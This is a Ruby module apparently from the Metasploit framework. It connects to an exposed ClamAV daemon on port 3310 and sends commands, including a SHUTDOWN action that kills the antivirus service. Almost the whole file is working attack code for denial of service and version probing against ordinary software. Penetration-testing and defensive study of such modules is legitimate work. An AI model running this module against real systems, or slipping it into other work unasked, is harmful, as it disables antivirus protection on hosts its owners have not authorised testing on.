##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ClamAV Remote Command Transmitter',
      'Description'    => %q{
        In certain configurations, ClamAV will bind to all addresses and listen for commands.
        This module sends properly-formatted commands to the ClamAV daemon if it is in such a
        configuration.
      },
      'Author'         => [
        'Alejandro Hdeza', #DISCOVER
        'bwatters-r7',     #MODULE
        'wvu'              #GUIDANCE
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'URL', 'https://twitter.com/nitr0usmx/status/740673507684679680/photo/1' ]
        ],
      'DisclosureDate' => 'Jun 8 2016',
      'Actions'        => [
        [ 'VERSION',  'Description' => 'Get Version Information' ],
        [ 'SHUTDOWN', 'Description' => 'Kills ClamAV Daemon' ]
      ],
      'DefaultAction'  => 'VERSION'
    ))
    register_options([
      Opt::RPORT(3310)
    ], self.class)
  end

  def run
    begin
      connect
      sock.put(action.name + "\n")
      print_good(sock.get_once)
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    rescue EOFError
      print_error('Successfully shut down ClamAV Service')
    ensure
      disconnect
    end

  end
end
